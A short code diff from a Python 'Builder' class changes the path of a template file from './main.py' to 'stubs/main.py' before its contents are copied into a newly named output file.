@@ -322,7 +322,7 @@ class Builder:
             f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}"
         )
 
-        with open("./main.py", "r", encoding="utf-8") as f:
+        with open("stubs/main.py", "r", encoding="utf-8") as f:
             code = f.read()
 
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
